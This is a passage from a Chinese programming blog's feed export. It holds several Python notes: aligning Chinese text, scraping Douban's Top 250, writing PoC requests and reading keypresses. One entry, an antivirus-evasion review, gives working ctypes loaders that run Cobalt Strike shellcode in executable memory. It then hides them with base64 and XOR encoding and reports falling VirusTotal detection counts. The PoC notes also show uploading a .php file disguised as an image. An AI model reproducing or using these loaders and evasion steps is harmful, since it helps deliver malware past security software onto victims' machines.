    <url>/2022/04/22/python-str-format-%E4%B8%AD%E6%96%87%E5%AF%B9%E9%BD%90%E7%9A%84%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98-This-is-Y/</url>
    <content><![CDATA[<p><strong>参考：</strong><br><strong><a class="link" href="https://www.cnblogs.com/Black-Ice/p/10846848.html">https://www.cnblogs.com/Black-Ice/p/10846848.html<i class="fas fa-external-link-alt"></i></a></strong><br><a class="link" href="https://blog.csdn.net/code4101/article/details/80985218">https://blog.csdn.net/code4101/article/details/80985218<i class="fas fa-external-link-alt"></i></a></p>
<p>解决方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">banner = <span class="string">&quot;1.abc&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\033[1;31m ***&#123;name:^&#123;len&#125;&#125;*** \033[0m&#x27;</span>.<span class="built_in">format</span>(name=banner,<span class="built_in">len</span>=<span class="number">22</span>-<span class="built_in">len</span>(banner.encode(<span class="string">&#x27;GBK&#x27;</span>))+<span class="built_in">len</span>(banner)))</span><br><span class="line"></span><br><span class="line">banner = <span class="string">&quot;2.纯中文&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\033[1;31m ***&#123;name:^&#123;len&#125;&#125;*** \033[0m&#x27;</span>.<span class="built_in">format</span>(name=banner,<span class="built_in">len</span>=<span class="number">22</span>-<span class="built_in">len</span>(banner.encode(<span class="string">&#x27;GBK&#x27;</span>))+<span class="built_in">len</span>(banner)))</span><br><span class="line"></span><br><span class="line">banner = <span class="string">&quot;3.中文and alphabet&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\033[1;31m ***&#123;name:^&#123;len&#125;&#125;*** \033[0m&#x27;</span>.<span class="built_in">format</span>(name=banner,<span class="built_in">len</span>=<span class="number">22</span>-<span class="built_in">len</span>(banner.encode(<span class="string">&#x27;GBK&#x27;</span>))+<span class="built_in">len</span>(banner)))</span><br></pre></td></tr></table></figure>

<p>效果：</p>
<p><img src="image-20220422205340602.png" alt="image-20220422205340602"></p>
]]></content>
  </entry>
  <entry>
    <title>python 爬虫获取豆瓣电影排行榜前250并写入excel</title>
    <url>/2020/06/26/python%20%E7%88%AC%E8%99%AB%E8%8E%B7%E5%8F%96%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1%E6%8E%92%E8%A1%8C%E6%A6%9C%E5%89%8D250%E5%B9%B6%E5%86%99%E5%85%A5excel-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13196523.html">源地址：https://www.cnblogs.com/This-is-Y/p/13196523.html<i class="fas fa-external-link-alt"></i></a></p>
<p>豆瓣电影排行榜前250 分为10页，第一页的url为<a class="link" href="https://movie.douban.com/top250,%E4%BD%86%E5%AE%9E%E9%99%85%E4%B8%8A%E5%BA%94%E8%AF%A5%E6%98%AFhttps://movie.douban.com/top250?start=0">https://movie.douban.com/top250,但实际上应该是https://movie.douban.com/top250?start=0<i class="fas fa-external-link-alt"></i></a> 后面的参数0表示从第几个开始，如0表示从第一（肖申克的救赎）到第二十五（触不可及），<a class="link" href="https://movie.douban.com/top250?start=25%E8%A1%A8%E7%A4%BA%E4%BB%8E%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%EF%BC%88%E8%9D%99%E8%9D%A0%E4%BE%A0%EF%BC%9A%E9%BB%91%E6%9A%97%E9%AA%91%E5%A3%AB%EF%BC%89%E5%88%B0%E7%AC%AC%E4%BA%94%E5%8D%81%E5%90%8D%EF%BC%88%E6%AD%BB%E4%BA%A1%E8%AF%97%E7%A4%BE%EF%BC%89%E3%80%82%E7%AD%89%E7%AD%89%EF%BC%8C">https://movie.douban.com/top250?start=25表示从第二十六（蝙蝠侠：黑暗骑士）到第五十名（死亡诗社）。等等，<i class="fas fa-external-link-alt"></i></a></p>
<p>所以可以用一个步长为25的range的for循环参数</p>
<p>分析完页面组成后，开始获取页面，直接request.get()发现没有返回任何东西，输出一下响应码</p>
<p>发现返回响应码418</p>
<img src="1503868-20200626195117645-2033306647.jpg" alt loading="lazy">

<p> </p>
<p> </p>
<p> 以前没见过这个，拉网线上网查一下，发现给get里面加一个header参数就行了</p>
<p>这里可以用自己浏览器的user-agent，如 </p>
<p>headers = {‘User-Agent’: ‘Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36’}</p>
<p>或者用fake_agent(安装直接用pip install fake_agent) 来为自己生成一个随机的agent添加到header字典中</p>
<p>之后就可以得到页面源码了。</p>
<p>然后使用lxml.etree，即xpath解析页面源码。用浏览器插件xpath finder快速定位到元素</p>
<img src="1503868-20200626200420506-1582812032.png" width="1100" loading="lazy">

<p> </p>
<p>但是直接这样子，解析到的是这样的结果</p>
<p>[&lt;Element span at 0x20b2f0cc488&gt;]</p>
<img src="1503868-20200626200546312-1189421585.png" alt loading="lazy">

<p> </p>
<p> 关于这东西是什么，有文章写的很好：<a class="link" href="https://www.jb51.net/article/132145.htm">https://www.jb51.net/article/132145.htm<i class="fas fa-external-link-alt"></i></a></p>
<p>这里我直接写解决部分，在使用xpath解析时，后面加上/text()</p>
<p>解决后，再使用xpath finder插件，一步一步获取到电影所有数据</p>
<p>最后把这个写在函数里，外面再套上一开始说的循环，就OK了</p>
<p> </p>
<p>在定位时，发现有4部电影介绍没有slogan，导致获取到的信息为空列表，也就导致了list.append()会出错。所以我加上了几个差错处理，解决方式可能有点傻，如果有更好的解决办法，洗耳恭听</p>
<p>代码在最后可以看到</p>
<img src="1503868-20200626202750677-1143963069.png" alt loading="lazy">

<p> </p>
<p> EXCEL保存部分</p>
<p>这里我用的xlwt</p>
<p>创建一个sheet表单。</p>
<p>数据保存到一个大列表中，列表嵌套列表</p>
<p>再通过循环把数据导入到excel表单中</p>
<p>最后在保存一下</p>
<p>注意文件后缀要用xls，用xlsx会导致文件打不开</p>
<p>然后就大功告成了</p>
<p>打开文件，手动加入排名，等部分信息（这些也可以在程序里完成，我嫌麻烦，就没写，直接手动来的快）</p>
<img src="1503868-20200627102831468-604045736.png" width="1200" loading="lazy">

<p> </p>
<p> </p>
<p> 前面的✓是我自己整的，用于记录那些看过，那些没看过</p>
<p>这也是我写这个东西的最初的目的</p>
<p>完整代码在下面，仅用于参考</p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>python免杀复习</title>
    <url>/2022/07/29/python%E5%85%8D%E6%9D%80%E5%A4%8D%E4%B9%A0-This-is-Y/</url>
    <content><![CDATA[<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>最基础的版本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">py3loader</span>(<span class="params">shellcode</span>):</span></span><br><span class="line">        shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line">        ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">        ptr = ctypes.windll.kernel32.VirtualAlloc(</span><br><span class="line">                ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                ctypes.c_int(<span class="built_in">len</span>(shellcode)),</span><br><span class="line">                ctypes.c_int(<span class="number">0x3000</span>),</span><br><span class="line">                ctypes.c_int(<span class="number">0x40</span>)</span><br><span class="line">        )</span><br><span class="line">        buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">        ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">                ctypes.c_uint64(ptr),</span><br><span class="line">                buf,</span><br><span class="line">                ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">        )</span><br><span class="line">        handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">                ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                ctypes.c_uint64(ptr),</span><br><span class="line">                ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">        )</span><br><span class="line">        ctypes.windll.kernel32.WaitForSingleObject(</span><br><span class="line">                ctypes.c_int(handle),</span><br><span class="line">                ctypes.c_int(-<span class="number">1</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode 为cs的 python x64</span></span><br><span class="line">buf = <span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00&quot;</span></span><br><span class="line">py3loader(buf)</span><br></pre></td></tr></table></figure>
<p>一个加载器，一个shellcode，编译用的pyisntaller，5mb左右，火绒秒杀</p>
<p>pyinstaller –noconsole –icon xxx.ico –onefile loader.py</p>
<p><strong>19 / 71</strong>  <a class="link" href="https://www.virustotal.com/gui/file/8a7c2741dc2755b16e29ab4d508fbf8bd9db5320a55aba54bb4c1a0196aeb6cd?nocache=1">https://www.virustotal.com/gui/file/8a7c2741dc2755b16e29ab4d508fbf8bd9db5320a55aba54bb4c1a0196aeb6cd?nocache=1<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="image-20220729232303195.png" alt="image-20220729232303195"></p>
<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>稍微修改了一下，修改的地方在import这里，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_int,c_uint64,windll,c_char,pointer</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">py3loader2</span>(<span class="params">shellcode</span>):</span></span><br><span class="line">        shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line">        windll.kernel32.VirtualAlloc.restype = c_uint64</span><br><span class="line">        ptr = windll.kernel32.VirtualAlloc(</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_int(<span class="built_in">len</span>(shellcode)),</span><br><span class="line">                c_int(<span class="number">0x3000</span>),</span><br><span class="line">                c_int(<span class="number">0x40</span>)</span><br><span class="line">        )</span><br><span class="line">        buf = (c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">        windll.kernel32.RtlMoveMemory(</span><br><span class="line">                c_uint64(ptr),</span><br><span class="line">                buf,</span><br><span class="line">                c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">        )</span><br><span class="line">        handle = windll.kernel32.CreateThread(</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_uint64(ptr),</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                pointer(c_int(<span class="number">0</span>))</span><br><span class="line">        )</span><br><span class="line">        windll.kernel32.WaitForSingleObject(</span><br><span class="line">                c_int(handle),</span><br><span class="line">                c_int(-<span class="number">1</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode 为cs的 python x64</span></span><br><span class="line">buf = <span class="string">b&quot;\xfc\x48\x83\xe4…………\x69\xa0\x8d&quot;</span></span><br><span class="line">py3loader2(buf)</span><br></pre></td></tr></table></figure>

<p>就一个加载器，一个shellcode，用pyinstaller编译后大概5mb。火绒秒杀</p>
<p><strong>9/71</strong> <a class="link" href="https://www.virustotal.com/gui/file/8fae57723e3eb442bd4fea37c93deec076bd026d834c801fafb8b88bee8e4c53">https://www.virustotal.com/gui/file/8fae57723e3eb442bd4fea37c93deec076bd026d834c801fafb8b88bee8e4c53<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="image-20220729231200599.png" alt="image-20220729231200599"></p>
<h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>在2的基础上，把shellcode拿出来了，做了一个读文件，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_int,c_uint64,windll,c_char,pointer</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">py3loader2</span>(<span class="params">shellcode</span>):</span></span><br><span class="line">        shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line">        windll.kernel32.VirtualAlloc.restype = c_uint64</span><br><span class="line">        ptr = windll.kernel32.VirtualAlloc(</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_int(<span class="built_in">len</span>(shellcode)),</span><br><span class="line">                c_int(<span class="number">0x3000</span>),</span><br><span class="line">                c_int(<span class="number">0x40</span>)</span><br><span class="line">        )</span><br><span class="line">        buf = (c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">        windll.kernel32.RtlMoveMemory(</span><br><span class="line">                c_uint64(ptr),</span><br><span class="line">                buf,</span><br><span class="line">                c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">        )</span><br><span class="line">        handle = windll.kernel32.CreateThread(</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_uint64(ptr),</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                pointer(c_int(<span class="number">0</span>))</span><br><span class="line">        )</span><br><span class="line">        windll.kernel32.WaitForSingleObject(</span><br><span class="line">                c_int(handle),</span><br><span class="line">                c_int(-<span class="number">1</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;loadpay&quot;</span>,<span class="string">&#x27;r&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    buf = f.read()</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;buf = b&#x27;&#123;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(buf))</span><br><span class="line"></span><br><span class="line">py3loader2(buf)</span><br></pre></td></tr></table></figure>
<p>编译，效果一般，还更差了。</p>
<p><strong>29/ 71</strong>  <a class="link" href="https://www.virustotal.com/gui/file/7ce8b35e3175fa4772b7e5226fed57dc063e2242eefd91ede0c79bfc341675a7">https://www.virustotal.com/gui/file/7ce8b35e3175fa4772b7e5226fed57dc063e2242eefd91ede0c79bfc341675a7<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="image-20220729232615613.png" alt="image-20220729232615613"></p>
<h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><p>在3的基础上，对代码进行编码，之后再解码运行，<br>spawn.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">txt = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def py3loader2(shellcode):</span></span><br><span class="line"><span class="string">        shellcode = bytearray(shellcode)</span></span><br><span class="line"><span class="string">        windll.kernel32.VirtualAlloc.restype = c_uint64</span></span><br><span class="line"><span class="string">        ptr = windll.kernel32.VirtualAlloc(</span></span><br><span class="line"><span class="string">                c_int(0),</span></span><br><span class="line"><span class="string">                c_int(len(shellcode)),</span></span><br><span class="line"><span class="string">                c_int(0x3000),</span></span><br><span class="line"><span class="string">                c_int(0x40)</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">        buf = (c_char * len(shellcode)).from_buffer(shellcode)</span></span><br><span class="line"><span class="string">        windll.kernel32.RtlMoveMemory(</span></span><br><span class="line"><span class="string">                c_uint64(ptr),</span></span><br><span class="line"><span class="string">                buf,</span></span><br><span class="line"><span class="string">                c_int(len(shellcode))</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">        handle = windll.kernel32.CreateThread(</span></span><br><span class="line"><span class="string">                c_int(0),</span></span><br><span class="line"><span class="string">                c_int(0),</span></span><br><span class="line"><span class="string">                c_uint64(ptr),</span></span><br><span class="line"><span class="string">                c_int(0),</span></span><br><span class="line"><span class="string">                c_int(0),</span></span><br><span class="line"><span class="string">                pointer(c_int(0))</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">        windll.kernel32.WaitForSingleObject(</span></span><br><span class="line"><span class="string">                c_int(handle),</span></span><br><span class="line"><span class="string">                c_int(-1)</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">with open(&quot;loadpay&quot;,&#x27;r&#x27;)as f:</span></span><br><span class="line"><span class="string">        buf = f.read()</span></span><br><span class="line"><span class="string">exec(&quot;buf = b&#x27;&#123;&#125;&#x27;&quot;.format(buf))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">py3loader2(buf)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode <span class="keyword">as</span> a64en</span><br><span class="line">t = a64en(txt.encode())</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行spawn.py生成一串base64编码后的字符串，然后放在下面的代码里。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode <span class="keyword">as</span> a64de</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_int,c_uint64,windll,c_char,pointer</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">asdf</span>(<span class="params">qwer</span>):</span></span><br><span class="line">        <span class="built_in">exec</span>(qwer)</span><br><span class="line">qwer = a64de(<span class="string">b&#x27;CmRlZiBweTNsb2FkZX………………dWYpCg==&#x27;</span>)</span><br><span class="line">asdf(qwer)</span><br></pre></td></tr></table></figure>

<p>再编译该文件，还是5m<br><strong>7/ 71</strong><br><a class="link" href="https://www.virustotal.com/gui/file/50514eed6469eec609b0a76b3db0e3ec051407d7dcd464b1093a63470b33afce">https://www.virustotal.com/gui/file/50514eed6469eec609b0a76b3db0e3ec051407d7dcd464b1093a63470b33afce<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="image-20220729233506022.png" alt="image-20220729233506022"></p>
<h1 id="5"><a href="#5" class="headerlink" title="5"></a>5</h1><p>在晚上随便找了一个异或加密的算法，<br>spawn.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">txt = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def py3loader2(shellcode):</span></span><br><span class="line"><span class="string">        shellcode = bytearray(shellcode)</span></span><br><span class="line"><span class="string">        windll.kernel32.VirtualAlloc.restype = c_uint64</span></span><br><span class="line"><span class="string">        ptr = windll.kernel32.VirtualAlloc(</span></span><br><span class="line"><span class="string">                c_int(0),</span></span><br><span class="line"><span class="string">                c_int(len(shellcode)),</span></span><br><span class="line"><span class="string">                c_int(0x3000),</span></span><br><span class="line"><span class="string">                c_int(0x40)</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">        buf = (c_char * len(shellcode)).from_buffer(shellcode)</span></span><br><span class="line"><span class="string">        windll.kernel32.RtlMoveMemory(</span></span><br><span class="line"><span class="string">                c_uint64(ptr),</span></span><br><span class="line"><span class="string">                buf,</span></span><br><span class="line"><span class="string">                c_int(len(shellcode))</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">        handle = windll.kernel32.CreateThread(</span></span><br><span class="line"><span class="string">                c_int(0),</span></span><br><span class="line"><span class="string">                c_int(0),</span></span><br><span class="line"><span class="string">                c_uint64(ptr),</span></span><br><span class="line"><span class="string">                c_int(0),</span></span><br><span class="line"><span class="string">                c_int(0),</span></span><br><span class="line"><span class="string">                pointer(c_int(0))</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">        windll.kernel32.WaitForSingleObject(</span></span><br><span class="line"><span class="string">                c_int(handle),</span></span><br><span class="line"><span class="string">                c_int(-1)</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">with open(&quot;loadpay&quot;,&#x27;r&#x27;)as f:</span></span><br><span class="line"><span class="string">        buf = f.read()</span></span><br><span class="line"><span class="string">exec(&quot;buf = b&#x27;&#123;&#125;&#x27;&quot;.format(buf))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">py3loader2(buf)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode <span class="keyword">as</span> a64en</span><br><span class="line">t = a64en(txt.encode())</span><br><span class="line">key = <span class="string">&#x27;this_is_y&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_crypt</span>(<span class="params">data, key</span>):</span></span><br><span class="line">    cipher_data = []</span><br><span class="line">    len_data = <span class="built_in">len</span>(data)</span><br><span class="line">    len_key = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(len_data):</span><br><span class="line">        bias = key[idx % len_key]</span><br><span class="line">        curr_byte = data[idx]</span><br><span class="line">        cipher_data.append(bias ^ curr_byte)</span><br><span class="line">    <span class="keyword">return</span> a64en(<span class="built_in">bytearray</span>(cipher_data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xort = xor_crypt(t,key.encode())</span><br><span class="line"><span class="built_in">print</span>(xort)</span><br></pre></td></tr></table></figure>
<p>原理和4其实一样，多了一次亦或加密罢了，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode <span class="keyword">as</span> a64de</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_int,c_uint64,windll,c_char,pointer</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">asdf</span>(<span class="params">qwer</span>):</span></span><br><span class="line">        <span class="built_in">exec</span>(qwer)</span><br><span class="line">key = <span class="string">&#x27;this_is_y&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_crypt</span>(<span class="params">data, key</span>):</span></span><br><span class="line">    cipher_data = []</span><br><span class="line">    len_data = <span class="built_in">len</span>(data)</span><br><span class="line">    len_key = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(len_data):</span><br><span class="line">        bias = key[idx % len_key]</span><br><span class="line">        curr_byte = data[idx]</span><br><span class="line">        cipher_data.append(bias ^ curr_byte)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>(cipher_data)</span><br><span class="line"></span><br><span class="line">qwer = a64de(<span class="string">b&#x27;NwU7HwUAMSgcICYaEW0vGAU……………………SUAGzYNJAYJNw9UTg==&#x27;</span>)</span><br><span class="line">qwer = xor_crypt(qwer,key.encode())</span><br><span class="line">qwer = a64de(qwer)</span><br><span class="line">asdf(qwer)</span><br></pre></td></tr></table></figure>
<p>编译后还是5mb多点，效果没变化。就这样吧<br><strong>7/71</strong>    <a class="link" href="https://www.virustotal.com/gui/file/984a384d97124e6d12c4dace0416b8f22df8be1bdb329566bdc228c4046cfe98?nocache=1">https://www.virustotal.com/gui/file/984a384d97124e6d12c4dace0416b8f22df8be1bdb329566bdc228c4046cfe98?nocache=1<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="image-20220729233841390.png" alt="image-20220729233841390"></p>
]]></content>
  </entry>
  <entry>
    <title>python写poc时的笔记</title>
    <url>/2021/12/02/python%E5%86%99poc%E6%97%B6%E7%9A%84%E7%AC%94%E8%AE%B0-This-is-Y/</url>
    <content><![CDATA[<h3 id="requests请求"><a href="#requests请求" class="headerlink" title="requests请求"></a>requests请求</h3><p>在批量验证是，不要直接写<br>    rsp=request.get<br>这一块尽可能的使用try，同时设置timeout和verify<br>    verify=False, timeout=25<br>如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    rsp = requests.post(url=url,headers=headers,files=uploaddata,verify=<span class="literal">False</span>, timeout=<span class="number">25</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h3 id="multipart文件上传"><a href="#multipart文件上传" class="headerlink" title="multipart文件上传"></a>multipart文件上传</h3><p>   python发送一个文件上传的请求包，这里我使用的requests包，因为没找到直接在数据包里修改数据的办法，所以我采取的办法是先建立一个文件，在打开一个它。</p>
<p>注意这里使用的是files=uploaddata，指定files，如果用的data，那就不是上传文件了。<del>（花了一小时在这上面，太憨憨了）</del></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test2.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">       <span class="comment"># f.write(&#x27;&lt;?php echo &quot;py&quot;;phpinfo();?&gt;\n&#x27;)</span></span><br><span class="line">       f.write(<span class="string">&#x27;hello world\n&#x27;</span>)</span><br><span class="line">   uploaddata = &#123;</span><br><span class="line">   	<span class="string">&#x27;Filedata&#x27;</span>:(<span class="string">&#x27;test.php&#x27;</span>,<span class="built_in">open</span>(<span class="string">&#x27;test2.php&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;image/jpeg&#x27;</span>) <span class="comment"># image或者file</span></span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">       rsp = requests.post(url=url,headers=headers,files=uploaddata,verify=<span class="literal">False</span>, timeout=<span class="number">25</span>)</span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br></pre></td></tr></table></figure>





]]></content>
  </entry>
  <entry>
    <title>python实时输入检测</title>
    <url>/2021/10/11/python%E5%AE%9E%E6%97%B6%E8%BE%93%E5%85%A5%E6%A3%80%E6%B5%8B-This-is-Y/</url>
    <content><![CDATA[<p>简单说一下功能和缺点</p>
<ul>
<li>功能：可以实时检测输入的按键，不用按回车</li>
<li>缺点：只能在linux下运行，windows下运行会报错ModuleNotFoundError: No module named ‘termios’，</li>
</ul>
<p>在windows上可以考虑使用wsl，子系统来运行代码，亲测有效，不过产生了一个新的小问题，ctrl+c没法停止程序了。所以写的时候可以留一个关键字用来跳出循环<br><img src="image-20211011161726975.png" alt="image-20211011161726975"></p>
<p>上代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tty</span><br><span class="line"><span class="keyword">import</span> termios</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readchar</span>():</span></span><br><span class="line">        fd = sys.stdin.fileno()</span><br><span class="line">        old_settings = termios.tcgetattr(fd)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">                tty.setraw(sys.stdin.fileno())</span><br><span class="line">                ch = sys.stdin.read(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">                termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)</span><br><span class="line">        <span class="keyword">return</span> ch</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readkey</span>(<span class="params">getchar_fn=<span class="literal">None</span></span>):</span></span><br><span class="line">        getchar = getchar_fn <span class="keyword">or</span> readchar</span><br><span class="line">        c1 = getchar()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(c1) != <span class="number">0x1b</span>:</span><br><span class="line">                <span class="keyword">return</span> c1</span><br><span class="line">        c2 = getchar()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(c2) != <span class="number">0x5b</span>:</span><br><span class="line">                <span class="keyword">return</span> c1</span><br><span class="line">        c3 = getchar()</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>(<span class="number">0x10</span> + <span class="built_in">ord</span>(c3) - <span class="number">65</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        key=readkey()</span><br><span class="line">        <span class="keyword">if</span> key==<span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                <span class="comment">#go_forward()</span></span><br><span class="line">                <span class="comment"># print(&quot;\032[1m;33m保留\033[0m &quot;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;保留&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> key==<span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">                <span class="comment">#go_back()</span></span><br><span class="line">                <span class="comment"># print(&quot;\033[1m;33m跳过\033[0m &quot;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;跳过&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> key==<span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">                <span class="comment"># print(&quot;\031[1m;33m退出\033[0m &quot;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;退出&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>python多线程失败，一直只有一个线程的解决办法</title>
